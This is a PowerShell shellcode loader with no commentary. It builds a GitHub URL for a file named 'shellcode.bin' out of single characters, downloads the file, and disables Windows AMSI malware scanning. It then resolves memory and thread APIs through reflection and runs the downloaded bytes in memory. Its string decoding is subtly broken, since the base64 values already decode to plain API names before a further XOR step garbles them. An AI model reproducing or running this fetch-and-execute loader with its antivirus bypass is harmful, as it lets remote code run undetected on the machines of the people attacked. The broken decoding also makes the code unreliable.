${u} = -join('h','t','t','p','s',':','/','/','g','i','t','h','u','b','.','c','o','m','/','M','J','0','6','-','B','P','/','b','p','/','r','a','w','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','s','h','e','l','l','c','o','d','e','.','b','i','n')
function x($s) {
    $b = [Convert]::FromBase64String($s)
    for($i=0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor 0x4F }
    [Text.Encoding]::UTF8.GetString($b)
}
${k} = x 'a2VybmVsMzIuZGxs'
${l} = x 'TG9hZExpYnJhcnk='
${g} = x 'R2V0UHJvY0FkZHJlc3M='
${a} = x 'VmlydHVhbEFsbG9j'
${p} = x 'VmlydHVhbFByb3RlY3Q='
${c} = x 'Q3JlYXRlVGhyZWFk'
${w} = x 'V2FpdEZvclNpbmdsZU9iamVjdA=='
try {
    $wc = New-Object Net.WebClient
    $b = $wc.DownloadData(${u})
} catch { exit }
${n} = $b.Length
${tA} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if (${tA}) { ${tA}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
function dt($ret, $par) {
    $ab = [Reflection.Assembly]::Load('System.Core')
    $dm = $ab.GetType('System.Runtime.CompilerServices.RuntimeHelpers').GetMethod('GetHashCode')
    $da = New-Object Reflection.Emit.AssemblyName('d')
    $da = [AppDomain]::CurrentDomain.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $dm = $da.DefineDynamicModule('m')
    $dt = $dm.DefineType('z','Public,Sealed,Serializable,BeforeFieldInit', [Delegate])
    $dc = $dt.DefineConstructor('RTSpecialName,HideBySig,Public', [Reflection.CallingConventions]::Standard, $par)
    $dc.SetImplementationFlags('Runtime,Managed')
    $dm = $dt.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual', $ret, $par)
    $dm.SetImplementationFlags('Runtime,Managed')
    $dt.CreateType()
}
$unsafe = [AppDomain]::CurrentDomain.GetAssemblies() | ?{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}
$nt = $unsafe.GetType('Microsoft.Win32.UnsafeNativeMethods')
$gh = $nt.GetMethod('GetModuleHandle',[Reflection.BindingFlags]'Public,Static')
$gp = $nt.GetMethod('GetProcAddress',[Reflection.BindingFlags]'Public,Static',$null,@([IntPtr],[String]),$null)
$h = $gh.Invoke($null,@($k))
function ga($n) { $gp.Invoke($null,@($h,$n)) }
$vaPtr = ga ${a}
$vpPtr = ga ${p}
$ctPtr = ga ${c}
$woPtr = ga ${w}
$dVA = dt ([IntPtr]) @([IntPtr],[uint32],[uint32],[uint32])
$dVP = dt ([bool])   @([IntPtr],[uint32],[uint32],[uint32].MakeByRefType())
$dCT = dt ([IntPtr]) @([IntPtr],[uint32],[IntPtr],[IntPtr],[uint32],[uint32].MakeByRefType())
$dWO = dt ([uint32]) @([IntPtr],[uint32])
$VA = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaPtr, $dVA)
$VP = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpPtr, $dVP)
$CT = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctPtr, $dCT)
$WO = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($woPtr, $dWO)
try {
    $m = $VA.Invoke([IntPtr]::Zero, ${n}, 0x3000, 0x04)
    if ($m -eq [IntPtr]::Zero) { exit }
    [Runtime.InteropServices.Marshal]::Copy($b, 0, $m, ${n})
    $op = 0
    $VP.Invoke($m, ${n}, 0x20, [ref]$op) | Out-Null
    $tid = 0
    $th = $CT.Invoke([IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [ref]$tid)
    if ($th -eq [IntPtr]::Zero) { exit }
    $WO.Invoke($th, 0xFFFFFFFF) | Out-Null
} catch { }
